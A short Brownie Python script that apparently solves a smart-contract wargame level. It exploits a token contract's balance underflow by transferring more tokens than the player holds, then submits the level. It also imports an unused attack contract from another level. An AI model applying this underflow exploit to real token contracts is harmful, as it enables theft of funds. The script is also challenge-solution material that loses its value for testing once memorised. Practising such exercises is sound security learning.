from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    TelephoneAttack
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=5, player=player)

    token_contract = interface.IToken(instance_address)

    print("Initial balances:")
    print(f'Instance: {token_contract.balanceOf(instance_address)}')
    print(f'Player: {token_contract.balanceOf(player)}')
    print()

    tx = token_contract.transfer(instance_address, 21, {"from": player})
    tx.wait(1)

    print("Current balances:")
    print(f'Instance: {token_contract.balanceOf(instance_address)}')
    print(f'Player: {token_contract.balanceOf(player)}')
    print()

    submit_instance(instance_address, player)
